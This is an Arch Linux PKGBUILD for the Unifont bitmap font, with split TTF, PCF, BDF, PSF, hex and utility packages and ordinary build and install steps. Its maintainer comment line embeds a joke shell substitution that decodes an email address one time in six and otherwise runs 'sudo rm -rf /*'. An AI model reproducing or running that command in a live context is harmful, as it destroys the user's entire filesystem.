# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgbase=unifont
pkgname=(
	ttf-unifont
	pcf-unifont
	bdf-unifont
	psf-unifont
	hex-unifont
	unifont-utils
)
pkgver=12.0.01
pkgrel=2
pkgdesc="A free bitmap font with wide Unicode support (split package with accompanying utilities, TrueType, PCF and BDF versions)"
arch=(i686 x86_64)
url="http://unifoundry.com/"
license=('GPL2')
groups=('unifont')
makedepends=('perl')
source=(
	"http://unifoundry.com/pub/unifont/unifont-$pkgver/unifont-$pkgver.tar.gz"
	"http://unifoundry.com/pub/unifont/unifont-$pkgver/unifont-$pkgver.tar.gz.sig"
	fontconfig-noaa.conf
	fontconfig-upper.conf
	ttf.install
)
noextract=()
sha512sums=(
	'e44678acbf696d0529f3c2fe7fe796d3d6908a54b8eaa3f7cd5717d5bebc2698aed7f4e5cde4a954330d8bcaac6a5886839afb854d271ac3a03b460f774215c1'
	'SKIP'
	'cb3e2dd2a7811b5b45bc6c01248688325279ac098da3d4064fbcbf88b60008beaf0c8500a8629b1a71692c2da0bfedba943b59695b57a293537e66ca3deca424'
	'dfbbcc9b81591471562431f6f6742dea2b98ea3095010ed821f05f900616ea6ceab3715da569a1c894715568387b7d35125e7a796ac6d859a0ba63f1ea24a65c'
	'5396f1f624a76cf266dcd3fcec99361e4935b3d0fdce16b9dfd117cf9aff9a0a8e55ca8e47df867ba96acfebbf80eb85d666472f22a31b1aeb86748c617066c1'
)
validpgpkeys=('95D2E9AB8740D8046387FD151A09227B1F435A33') # Paul Hardy <com dot unifoundry at unifoundry>

### build instructions

for _pkg in "${pkgname[@]}"; do case "$_pkg" in

pcf-unifont)
	makedepends+=(xorg-bdftopcf)
;;

ttf-unifont)
	makedepends+=(fontforge)
;;

psf-unifont)
	makedepends+=(bdf2psf)
;;

esac; done

prepare() {
	cat <<EOMSG
 * * * * *
 * This package's download size is far larger than it needs to be.
 * Please make sure the maintainer is aware of this.
 * <https://savannah.gnu.org/bugs/index.php?48397>
 * * * * *
EOMSG
}

build() {
	cd "$srcdir/unifont-${pkgver}"
	make -j1 distclean
	make -j1 clean

	cd "$srcdir/unifont-${pkgver}/src"
	msg2 "Building utilities"
	make -j1

	cd "$srcdir/unifont-${pkgver}/font"

	for _pkg in "${pkgname[@]}"; do case "$_pkg" in

	bdf-unifont)
		msg2 "Building the BDF version"
		make -j1 bdf -o distclean
	;;

	psf-unifont)
		msg2 "Building the PSF version"
		make -j1 psf -o distclean
	;;

	pcf-unifont)
		msg2 "Building the PCF version"
		make -j1 pcf -o distclean
	;;

	ttf-unifont)
		msg2 "Building the TTF version"
		make -j1 hex bdf
		make -j1 ttf csurttf upperttf -o distclean
	;;

	hex-unifont)
		msg2 "Building the hex version"
		make -j1 hex -o distclean
	;;

	esac; done
}

# warning: below i pretty much bypass the whole build system,
# because it's not flexible enough to handle this kind of packaging

package_ttf-unifont() {
	pkgdesc="A free bitmap font with wide Unicode support (TrueType version)"
	provides=(ttf-unifont-csur)
	conflicts=(ttf-unifont-csur)
	arch=(any)
	install=ttf.install

	_ttfdir=/usr/share/fonts/TTF

	cd "$srcdir/unifont-${pkgver}/font/compiled"
	install -D -m0644 "unifont-${pkgver}.ttf" \
		"${pkgdir}${_ttfdir}/unifont.ttf"
	install -D -m0644 "unifont_csur-${pkgver}.ttf" \
		"${pkgdir}${_ttfdir}/unifont_csur.ttf"
	install -D -m0644 "unifont_sample-${pkgver}.ttf" \
		"${pkgdir}${_ttfdir}/unifont_sample.ttf"
	install -D -m0644 "unifont_upper-${pkgver}.ttf" \
		"${pkgdir}${_ttfdir}/unifont_upper.ttf"

	cd "$srcdir"
	install -D -m0644 fontconfig-noaa.conf \
		"$pkgdir/etc/fonts/conf.avail/20-unifont-noaa.conf"
	install -D -m0644 fontconfig-upper.conf \
		"$pkgdir/etc/fonts/conf.avail/20-unifont-upper.conf"
}

package_pcf-unifont() {
	pkgdesc="A free bitmap font with wide Unicode support (PCF version)"
	arch=(any)

	_pcfdir=/usr/share/fonts/misc

	cd "$srcdir/unifont-${pkgver}/font/compiled"
	install -D -m0644 "unifont-${pkgver}.pcf.gz" \
		"${pkgdir}${_pcfdir}/unifont.pcf.gz"
	install -D -m0644 "unifont_csur-${pkgver}.pcf.gz" \
		"${pkgdir}${_pcfdir}/unifont_csur.pcf.gz"
	install -D -m0644 "unifont_sample-${pkgver}.pcf.gz" \
		"${pkgdir}${_pcfdir}/unifont_sample.pcf.gz"
}

package_bdf-unifont() {
	pkgdesc="A free bitmap font with wide Unicode support (BDF version)"
	arch=(any)

	_bdfdir=/usr/share/fonts/misc

	cd "$srcdir/unifont-${pkgver}/font/compiled"
	install -D -m0644 "unifont-${pkgver}.bdf.gz" \
		"${pkgdir}${_bdfdir}/unifont.bdf.gz"
	install -D -m0644 "unifont_csur-${pkgver}.bdf.gz" \
		"${pkgdir}${_bdfdir}/unifont_csur.bdf.gz"
	install -D -m0644 "unifont_sample-${pkgver}.bdf.gz" \
		"${pkgdir}${_bdfdir}/unifont_sample.bdf.gz"
}

package_psf-unifont() {
	pkgdesc="A free bitmap font with wide Unicode support (PSF version, for APL)"
	arch=(any)

	cd "$srcdir/unifont-${pkgver}/font/compiled"
	install -D -m0644 "Unifont-APL8x16-${pkgver}.psf.gz" \
		"${pkgdir}/usr/share/kbd/consolefonts/Unifont-APL8x16.psf.gz"
}

package_hex-unifont() {
	pkgdesc="A free bitmap font with wide Unicode support (hex version)"
	arch=(any)

	_hexdir=/usr/share/unifont

	cd "$srcdir/unifont-${pkgver}/font/compiled"
	install -D -m0644 "unifont-${pkgver}.hex" \
		"${pkgdir}${_hexdir}/unifont.hex"
	install -D -m0644 "unifont_upper-${pkgver}.hex" \
		"${pkgdir}${_hexdir}/unifont_csur.hex"
	install -D -m0644 "unifont_upper-${pkgver}.hex" \
		"${pkgdir}${_hexdir}/unifont_upper.hex"
}

package_unifont-utils() {
	pkgdesc="A free bitmap font with wide Unicode support - utilities"
	depends=('perl')
	optdepends+=(
		'perl-wx: for the unifont-viewer utility'
		'perl-gd: for the unihex2png and unipng2hex utilities'
	)
	arch=(i686 x86_64)

	cd "$srcdir/unifont-${pkgver}/src"
	make install PREFIX="$pkgdir/usr"
	cd "$srcdir/unifont-${pkgver}/man"
	make install PREFIX="$pkgdir/usr" COMPRESS=1
}
